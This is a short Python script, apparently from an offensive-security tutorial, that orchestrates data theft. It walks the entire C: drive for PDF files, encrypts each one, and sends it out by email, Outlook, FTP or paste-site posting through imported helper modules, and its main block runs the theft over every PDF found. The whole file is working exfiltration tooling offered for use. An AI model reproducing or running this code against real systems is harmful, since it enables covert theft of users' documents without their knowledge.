from crypter import encrypt, decrypt  # Import modules we wrote
from email_exfil import outlook, plain_email
from transmit_exfil import plain_ftp, transmit
from paste_exfil import ie_paste, plain_paste

import os

# A dictionary with the values that correspond to the imported functions. (Dictionary Dispatch).
EXFIL = {
    'outlook': outlook,
    'plain_email': plain_email,
    'plain_ftp': plain_ftp,
    'transmit': transmit,
    'ie_paste': ie_paste,
    'plain_paste': plain_paste,
}

# Function to find the document we want to exfiltrate.
def find_docs(doc_type='.pdf'):
    # This one walks the entire filesystem looking for PDF files.
    for parent, _, filenames in os.walk('c:\\'):
        for filename in [x for x in filenames if x.endswith(doc_type)]:
            document_path = os.path.join(parent, filename)
            # Return the full path if any:
            yield document_path

# Exfiltration Orchestrator:
def exfiltrate(document_path, method):
    # If the method involves file transfer
    if method in ['transmit', 'plain_ftp']:
        # Accepts an actual file and not an encoded string.
        filename = f'c:\\windows\\temp\\{os.path.basename(document_path)}'
        # Read the file content.:
        with open(document_path, 'rb') as f0:
            contents = f0.read()
        # Encrypt the content and wrtie to a file:
        with open(filename, 'wb') as f1:
            f1.write(encrypt(contents))

        # Pass the encrypted file to the exfiltration method.
        EXFIL[method](filename)
        # Remove the file from the temporary directory.
        os.unlink(filename)
    else:
        # For other exfiltration methods, simply read the file to be extracted.
        with open(document_path, 'rb') as f:
            contents = f.read()
        title = os.path.basename(document_path)
        # Encrypt the document content.
        contents = encrypt(contents)
        # Call the dictionary to email or pastebin the encrypted content.
        EXFIL[method](title, contents)

if __name__ == '__main__':
    for fpath in find_docs():
        exfiltrate(fpath, 'plain_paste')
